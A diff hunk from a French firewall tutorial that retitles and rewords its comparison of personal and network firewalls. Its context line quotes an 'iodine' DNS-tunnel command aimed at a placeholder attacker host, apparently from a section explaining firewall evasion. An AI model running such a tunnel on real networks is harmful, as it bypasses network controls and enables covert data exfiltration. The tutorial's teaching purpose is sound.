@@ -88,19 +88,19 @@ iodine -f -r attacker.com
 
 # 🔑 Différence entre Niveau 6 et Niveau 7
 
-### 🔹 Niveau 6 : Firewall personnel
+### 🔹 Niveau 6 : Pare-feu personnel
 - Protège uniquement **ta machine locale**.
-- Politique stricte : **tout est bloqué sauf quelques services**.
+- Applique une politique stricte : **tout est bloqué sauf quelques services essentiels**.
 - Idéal pour un **poste de travail** ou un **serveur isolé**.
 
 👉 **Exemple :** ton PC sous Parrot OS n’accepte que le trafic **web** et **SSH**.
 
 ---
 
-### 🔹 Niveau 7 : Firewall réseau
+### 🔹 Niveau 7 : Pare-feu réseau
 - Ta machine devient un **routeur + firewall**.
-- Protège **un réseau interne entier**.
-- Ajoute le **forwarding + NAT**.
+- Protèger **un réseau interne entier**.
+- Ajouter le **forwarding et NAT**.
 
 # ✅ Conclusion
 
